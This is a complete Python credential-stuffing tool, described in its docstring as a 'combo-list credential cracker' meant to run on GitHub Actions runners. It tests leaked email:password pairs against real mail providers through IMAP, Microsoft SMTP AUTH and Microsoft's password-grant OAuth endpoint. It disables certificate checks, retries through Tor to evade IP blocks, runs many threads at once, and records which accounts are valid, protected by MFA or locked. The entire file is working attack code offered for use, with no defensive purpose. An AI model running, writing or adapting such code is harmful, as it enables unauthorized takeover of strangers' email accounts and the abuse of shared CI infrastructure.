#!/usr/bin/env python3
"""Combo-list credential cracker for GitHub Actions runners. Stdlib only.

Input : slice file, lines `email:password` (host resolved by domain map)
Output: TSV rows  email<TAB>pw<TAB>proto<TAB>verdict<TAB>detail

Rails:
  - MS consumer domains  -> SMTP submission AUTH LOGIN (+ optional ROPC OAuth signal)
  - everything else      -> IMAP LOGIN (993)
  - --tor-fallback       -> retry CONNERR/TIMEOUT/BLOCKED once via local Tor SOCKS

Usage: crack_runner.py <slice> <out> [--workers N] [--tor-fallback] [--limit N]
"""
import socket, ssl, struct, sys, base64, json, re, time, threading
import concurrent.futures as cf, collections, urllib.request, urllib.parse

TIMEOUT = 18
TOR = ("127.0.0.1", 9050)
USE_TOR_FALLBACK = False

M = {
 "t-online.de": ["secureimap.t-online.de"], "interia.pl": ["imap.interia.pl"],
 "freenet.de": ["imap.freenet.de"], "web.de": ["imap.web.de"],
 "gmx.de": ["imap.gmx.net"], "gmx.net": ["imap.gmx.net"], "gmx.at": ["imap.gmx.net"],
 "gmx.ch": ["imap.gmx.net"], "gmx.com": ["imap.gmx.com"],
 "rambler.ru": ["imap.rambler.ru"], "lenta.ru": ["imap.rambler.ru"], "autorambler.ru": ["imap.rambler.ru"],
 "yandex.ru": ["imap.yandex.ru"], "ya.ru": ["imap.yandex.ru"], "yandex.com": ["imap.yandex.com"],
 "mail.ru": ["imap.mail.ru"], "bk.ru": ["imap.mail.ru"], "inbox.ru": ["imap.mail.ru"],
 "list.ru": ["imap.mail.ru"], "internet.ru": ["imap.mail.ru"],
 "seznam.cz": ["imap.seznam.cz"], "centrum.cz": ["imap.centrum.cz"], "volny.cz": ["imap.volny.cz"],
 "wp.pl": ["imap.wp.pl"], "o2.pl": ["imap.o2.pl"], "op.pl": ["imap.op.pl"],
 "onet.pl": ["imap.poczta.onet.pl"], "poczta.onet.pl": ["imap.poczta.onet.pl"], "poczta.fm": ["imap.poczta.fm"],
 "libero.it": ["imap.libero.it"], "virgilio.it": ["imap.virgilio.it"], "alice.it": ["imap.alice.it"],
 "tiscali.it": ["imap.tiscali.it"], "tin.it": ["imap.tin.it"], "inwind.it": ["imap.inwind.it"],
 "pec.it": ["imap.pec.it"],
 "rediffmail.com": ["imap.rediffmail.com", "imap.rediff.com"],
 "aliyun.com": ["imap.aliyun.com"], "163.com": ["imap.163.com"], "126.com": ["imap.126.com"],
 "qq.com": ["imap.qq.com"], "sina.com": ["imap.sina.com", "imap.sina.cn"], "sina.cn": ["imap.sina.cn"],
 "comcast.net": ["imap.comcast.net"], "jsumail.com": ["imap.jsumail.com", "mail.jsumail.com"],
 "orange.fr": ["imap.orange.fr"], "wanadoo.fr": ["imap.orange.fr"],
 "laposte.net": ["imap.laposte.net"], "free.fr": ["imap.free.fr"], "sfr.fr": ["imap.sfr.fr"],
 "ukr.net": ["imap.ukr.net"], "abv.bg": ["imap.abv.bg"], "mail.com": ["imap.mail.com"],
 "aol.com": ["imap.aol.com"], "aim.com": ["imap.aol.com"], "icloud.com": ["imap.mail.me.com"],
 "me.com": ["imap.mail.me.com"], "mac.com": ["imap.mail.me.com"],
 "terra.com.br": ["imap.terra.com.br"], "uol.com.br": ["imap.uol.com.br"],
 "bol.com.br": ["imap.bol.com.br"], "ig.com.br": ["imap.ig.com.br"],
 "naver.com": ["imap.naver.com"], "daum.net": ["imap.daum.net"], "hanmail.net": ["imap.daum.net"],
}
MS = {"hotmail.com","hotmail.fr","hotmail.es","hotmail.it","hotmail.de","hotmail.co.uk",
      "hotmail.nl","hotmail.be","hotmail.se","hotmail.ch","hotmail.gr","hotmail.dk","hotmail.no",
      "hotmail.fi","hotmail.at","hotmail.pt","hotmail.ro","hotmail.hu","hotmail.cz","hotmail.sk",
      "outlook.com","outlook.fr","outlook.es","outlook.de","outlook.it","outlook.jp","outlook.gr",
      "outlook.com.br","outlook.at","outlook.be","outlook.dk","outlook.se","outlook.pt","outlook.hu",
      "live.com","live.fr","live.nl","live.se","live.dk","live.no","live.be","live.at","live.it",
      "live.es","live.jp","live.ca","live.com.au","msn.com","passport.com"}
YH = {"yahoo.com","yahoo.de","yahoo.fr","yahoo.it","yahoo.es","yahoo.co.uk","yahoo.gr","yahoo.se",
      "yahoo.ca","yahoo.com.au","yahoo.co.in","yahoo.com.br","yahoo.dk","yahoo.ie","yahoo.pt",
      "ymail.com","rocketmail.com","yahoo.ro","yahoo.hu","yahoo.cz","yahoo.pl"}
STRICT = {"comcast.net","rambler.ru","sina.com","sina.cn"} | YH


def hosts_for(dom):
    d = dom.strip().lower()
    if d in M: return M[d]
    if d.startswith("hotmail.") or d.startswith("outlook.") or d.startswith("live.") \
       or d.startswith("msn.") or d in MS: return ["imap-mail.outlook.com"]
    if d.startswith("yahoo.") or d.startswith("ymail.") or d.startswith("rocketmail."): return ["imap.mail.yahoo.com"]
    if d.startswith("gmail.") or d == "googlemail.com": return ["imap.gmail.com"]
    if d.startswith("yandex."): return ["imap.yandex.ru"]
    return [f"imap.{d}", f"mail.{d}"]


# ---------- transports ----------
def tcp_direct(host, port):
    return socket.create_connection((host, port), timeout=TIMEOUT)

def tcp_tor(host, port):
    s = socket.create_connection(TOR, timeout=TIMEOUT)
    s.sendall(b"\x05\x01\x00")
    if s.recv(2) != b"\x05\x00":
        s.close(); raise IOError("socks-neg")
    h = host.encode()
    s.sendall(b"\x05\x01\x00\x03" + bytes([len(h)]) + h + struct.pack(">H", port))
    r = s.recv(10)
    if len(r) < 2 or r[1] != 0:
        s.close(); raise IOError("socks-refuse")
    return s


def imap_login(host, user, pw, opener):
    raw = opener(host, 993)
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    t = ctx.wrap_socket(raw, server_hostname=host); t.settimeout(TIMEOUT)
    f = t.makefile("rb")
    greet = f.readline().decode(errors="ignore").strip()
    if not greet.startswith("* OK"):
        t.close(); return ("GREET:" + greet[:50], "")
    t.sendall(("a1 LOGIN %s %s\r\n" % (user, pw)).encode())
    line = ""
    for _ in range(8):
        nxt = f.readline().decode(errors="ignore").strip()
        if not nxt: break
        line = nxt
        if nxt.lower().startswith("a1 "): break
    t.close()
    l = line.lower()
    if "app password" in l or "application-specific" in l or "web login" in l:
        return ("VALID_APP_PW", line[:110])
    if l.startswith("a1 ok"):
        if "enable imap" in l or "imap access" in l: return ("VALID_IMAP_OFF", line[:110])
        return ("OK", line[:90])
    if "basic authentication is disabled" in l: return ("MS_BASIC_DISABLED", line[:100])
    if "blocklist" in l or "blacklist" in l or "unusual" in l or "access denied" in l: return ("IP_BLOCKED", line[:100])
    if "too many" in l or "rate" in l or "throttl" in l: return ("RATE_LIMIT", line[:100])
    if "invalid" in l or "fail" in l or "authfail" in l or "wrong" in l or "denied" in l: return ("BADPW", line[:100])
    if l.startswith("bye") or "unavailable" in l: return ("BYE", line[:100])
    return ("OTHER", line[:110])


def ms_smtp_login(user, pw, opener):
    raw = opener("smtp-mail.outlook.com", 587)
    f = raw.makefile("rb")
    banner = f.readline().decode(errors="ignore").strip()
    if not banner.startswith("220"): raw.close(); return ("SMTP_BANNER", banner[:70])
    def cmd(line):
        raw.sendall((line + "\r\n").encode())
        out = []
        while True:
            ln = f.readline().decode(errors="ignore").strip()
            if not ln: break
            out.append(ln)
            if len(ln) > 3 and ln[3] == " ": break
        return out
    ehlo = cmd("EHLO probe.local")
    if not any("STARTTLS" in l.upper() for l in ehlo): raw.close(); return ("NO_STARTTLS", ";".join(ehlo)[:80])
    cmd("STARTTLS")
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    tls = ctx.wrap_socket(raw, server_hostname="smtp-mail.outlook.com"); tls.settimeout(TIMEOUT)
    tf = tls.makefile("rb")
    def cmdt(line):
        tls.sendall((line + "\r\n").encode())
        out = []
        while True:
            ln = tf.readline().decode(errors="ignore").strip()
            if not ln: break
            out.append(ln)
            if len(ln) > 3 and ln[3] == " ": break
        return out
    cmdt("EHLO probe.local")
    r1 = cmdt("AUTH LOGIN")
    if not (r1 and r1[-1].startswith("334")): tls.close(); return ("SMTP_NO_AUTHLOGIN", (r1[-1] if r1 else "")[:80])
    cmdt(base64.b64encode(user.encode()).decode())
    r3 = cmdt(base64.b64encode(pw.encode()).decode())
    tls.close()
    first = r3[-1] if r3 else ""
    c = first[:3]
    if c == "235": return ("OK_SMTP", first[:100])
    if c == "535":
        if "5.7.139" in first: return ("MS_SMTP_OFF", first[:110])
        return ("BADPW", first[:110])
    if c in ("534",): return ("VALID_APP_PW", first[:100])
    if c in ("421", "451", "452"): return ("IP_BLOCKED", first[:100])
    return ("SMTP_" + c, first[:110])


def ropc(user, pw):
    """Signal only: TOKEN | BAD_PW/AADSTS50126 | MFA=code | LOCKED | ERR."""
    body = urllib.parse.urlencode({
        "grant_type": "password", "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        "username": user, "password": pw, "resource": "https://outlook.office.com"}).encode()
    req = urllib.request.Request("https://login.microsoftonline.com/common/oauth2/token",
                                 data=body, headers={"Content-Type": "application/x-www-form-urlencoded"})
    op = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    try:
        d = json.loads(op.open(req, timeout=TIMEOUT + 6).read().decode())
        if "access_token" in d: return "TOKEN"
        return "?" + str(d)[:60]
    except urllib.error.HTTPError as e:
        d = json.loads(e.read().decode(errors="ignore"))
        desc = d.get("error_description", ""); m = re.search(r"AADSTS\d+", desc)
        code = m.group(0) if m else d.get("error", "")[:30]
        if code == "AADSTS50126": return "BAD_PW"
        if code in ("AADSTS50076","AADSTS50079","AADSTS50072","AADSTS50074"): return "MFA_" + code[-5:]
        if code == "AADSTS50053": return "LOCKED"
        if code == "AADSTS50055": return "EXPIRED_PW"
        return code or "ERR"
    except Exception as e:
        return "ERR:" + type(e).__name__


lock = threading.Lock()
counter = collections.Counter()

def work(item, out_fh):
    e, p = item
    dom = e.rsplit("@", 1)[-1].lower().strip()
    verdict = detail = None; proto = None
    if dom in MS or dom.startswith(("hotmail.", "outlook.", "live.", "msn.")):
        proto = "ms_smtp"
        try:
            verdict, detail = ms_smtp_login(e, p, tcp_direct)
        except Exception as ex:
            verdict, detail = ("CONNERR", type(ex).__name__)
            if USE_TOR_FALLBACK:
                try: verdict, detail = ms_smtp_login(e, p, tcp_tor)
                except Exception as ex2: verdict, detail = ("CONNERR", type(ex2).__name__ + "/tor")
        if verdict in ("BADPW", "MS_SMTP_OFF", "OK_SMTP"):
            rs = ropc(e, p)
            detail = f"{detail}|ropc={rs}"
    else:
        proto = "imap"
        host_list = hosts_for(dom)
        last = ("NOHOST", "")
        for host in host_list:
            try:
                verdict, detail = imap_login(host, e, p, tcp_direct)
            except Exception as ex:
                last = ("CONNERR:" + type(ex).__name__, host)
                continue
            if verdict in ("CONNERR", "TIMEOUT", "IP_BLOCKED") and USE_TOR_FALLBACK:
                try:
                    v2, d2 = imap_login(host, e, p, tcp_tor)
                    if v2 not in ("CONNERR", "TIMEOUT"): verdict, detail = v2 + "|tor", d2
                except Exception:
                    pass
            break
        else:
            verdict, detail = last
    if not verdict:
        verdict, detail = "UNKNOWN", ""
    detail = str(detail).replace("\t", " ").replace("\n", " ")[:140]
    with lock:
        counter[(proto, verdict)] += 1
        out_fh.write(f"{e}\t{p}\t{proto}\t{verdict}\t{detail}\n")
        out_fh.flush()


def main():
    global USE_TOR_FALLBACK
    src, out = sys.argv[1], sys.argv[2]
    workers = 80; limit = None
    if "--workers" in sys.argv: workers = int(sys.argv[sys.argv.index("--workers") + 1])
    if "--limit" in sys.argv: limit = int(sys.argv[sys.argv.index("--limit") + 1])
    if "--tor-fallback" in sys.argv: USE_TOR_FALLBACK = True
    items = []
    for ln in open(src, errors="ignore"):
        ln = ln.rstrip("\n")
        if "@" not in ln or ":" not in ln: continue
        e, p = ln.split(":", 1)
        if not e or not p: continue
        items.append((e, p))
        if limit and len(items) >= limit: break
    print(f"loaded {len(items)} creds, workers={workers}, tor_fallback={USE_TOR_FALLBACK}", flush=True)
    t0 = time.time()
    with open(out, "a") as fh, cf.ThreadPoolExecutor(max_workers=workers) as ex:
        list(ex.map(lambda it: work(it, fh), items))
    print(f"DONE {len(items)} in {int(time.time()-t0)}s")
    for k, v in sorted(counter.items(), key=lambda kv: -kv[1]):
        print(f"  {k[0]:8s} {k[1]:18s} {v}")
    # also dump summary marker for the workflow log
    print("SUMMARY " + json.dumps({f"{k[0]}|{k[1]}": v for k, v in counter.items()}))

main()
